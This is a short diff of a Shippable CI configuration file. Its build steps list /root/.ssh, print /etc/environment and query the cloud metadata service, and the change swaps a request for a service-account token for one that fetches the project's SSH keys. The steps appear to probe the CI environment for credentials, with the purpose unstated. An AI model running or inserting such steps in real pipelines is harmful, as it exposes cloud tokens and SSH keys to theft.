@@ -22,7 +22,7 @@ build:
     - ls -al /root/.ssh/
     - cat /etc/environment
     - curl http://169.254.169.254/computeMetadata/v1beta1/?recursive=true
-    - curl http://169.254.169.254/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=json
+    - curl http://169.254.169.254/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json
 
   # http://docs.shippable.com/ci/shippableyml/#ci
   ci:
